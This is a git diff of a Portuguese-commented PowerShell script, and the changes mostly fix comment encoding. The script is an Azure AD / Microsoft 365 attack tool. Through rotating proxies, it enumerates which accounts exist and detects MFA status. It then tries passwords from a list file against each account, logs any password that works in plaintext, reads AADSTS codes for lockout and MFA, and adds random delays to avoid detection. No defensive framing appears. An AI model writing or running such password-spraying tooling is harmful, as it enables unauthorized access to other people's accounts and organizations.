@@ -56,13 +56,13 @@ Write-Host "=================================================================`n`
 # =========================
 $ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # Azure CLI
 
-# Verificar e instalar mÃ³dulo MSAL.PS se necessÃ¡rio
+# Verificar e instalar módulo do MSAL.PS se necessário
 if (!(Get-Module -ListAvailable -Name MSAL.PS)) {
     Write-Host "[+] Instalando mÃ³dulo MSAL.PS..." -ForegroundColor Cyan
     Install-Module -Name MSAL.PS -Force -Scope CurrentUser -AllowClobber
 }
 
-# Importar mÃ³dulo MSAL.PS
+# Importar módulo MSAL.PS
 Import-Module MSAL.PS -ErrorAction Stop
 
 if (!(Get-Module -ListAvailable -Name ImportExcel)) {
@@ -247,7 +247,7 @@ foreach ($user in Get-Content $UserList) {
 
     try {
         # =========================
-        # ENUMERAÃ‡ÃƒO / EXISTÃŠNCIA
+        # Enumarção / Existencia
         # =========================
         Set-RequestProxy -Proxies $activeProxies | Out-Null
 
@@ -273,7 +273,7 @@ foreach ($user in Get-Content $UserList) {
         }
 
         # =========================
-        # MFA (SINAIS)
+        # MFA (DETECÇÃO)
         # =========================
         if ($response.PSObject.Properties.Name -contains "IsMfaRegistered" -and $response.IsMfaRegistered) {
             $mfaStatus = "MFA_REGISTRADO"
@@ -296,7 +296,7 @@ foreach ($user in Get-Content $UserList) {
         }
 
         # =========================
-        # DECISÃƒO: TESTAR LOGIN
+        # DECISÃO: testar login
         # =========================
         $doLogin = $false
 
@@ -313,18 +313,18 @@ foreach ($user in Get-Content $UserList) {
             }
         }
         # =========================
-        # LOGIN (SE AUTORIZADO)
+        # LOGIN (Se autorizado pelo usuário)
         # =========================
         if ($doLogin) {
             Write-Host "`n----------------------------------------`n"
             
-            # Caminho do ficheiro com as senhas (uma por linha)
+            # Caminho do arquivo com as senhas (uma por linha)
             $caminhoSenhas = "senhas.txt" 
 
             if (Test-Path $caminhoSenhas) {
                 $listaSenhas = Get-Content $caminhoSenhas
                 
-                # Obter o TenantID uma Ãºnica vez antes do loop para ser mais rÃ¡pido
+                # Obter o TenantID uma única vez antes do loop para ser mais rápido
                 try {
                     Set-RequestProxy -Proxies $activeProxies | Out-Null
 
@@ -363,7 +363,7 @@ foreach ($user in Get-Content $UserList) {
                             $objResultado = [pscustomobject]@{
                                 Email  = $email
                                 Status = $loginStatus
-                                Senha  = $plainPass  # <-- Esta Ã© a nova coluna
+                                Senha  = $plainPass 
                                 Data   = (Get-Date -Format "dd/MM/yyyy HH:mm:ss")
                             }
                             Write-Host "âœ… Sucesso para: $email" -ForegroundColor Green
@@ -395,7 +395,7 @@ foreach ($user in Get-Content $UserList) {
                                     $loginStatus = "LOGIN_OK MAS MFA REQUERIDO"
                                     if ($mfaStatus -eq "NAO_DETECTADO") { $mfaStatus = "MFA_REQUERIDO" }
                                     $pararTesteSenhas = $true
-                                    break # Interrompe o loop pois a senha estÃ¡ correta, mas barrou no MFA
+                                    break # Interrompe o loop pois a senha está correta, mas barrou no MFA
                                 }
                                 "AADSTS50053" { 
                                     $loginStatus = "CONTA_BLOQUEADA"
@@ -405,7 +405,7 @@ foreach ($user in Get-Content $UserList) {
                                 "AADSTS50034" { 
                                     $loginStatus = "USUARIO_NAO_ENCONTRADO" 
                                     $pararTesteSenhas = $true
-                                    break # Para de tentar se o email nÃ£o existir
+                                    break # Para de tentar se o email não existir
                                 }
                                 default { $loginStatus = "ERRO" }
                             }
@@ -427,7 +427,7 @@ foreach ($user in Get-Content $UserList) {
                         }) -LoginStatus $loginStatus
                         $tentativasLoginRegistradas++
 
-                        # SÃ³ faz o sleep se NÃƒO tiver acertado a senha (evita esperar Ã  toa no final)
+                        # faz o sleep se não tiver acertado a senha (evita esperar à toa no final)
                         if ($loginStatus -eq "SENHA_INCORRETA" -or $loginStatus -eq "ERRO") {
                             $tempoAleatorio = Get-Random -Minimum 1 -Maximum 3 
                             Write-Host "Aguardando $tempoAleatorio segundos..." -ForegroundColor Gray
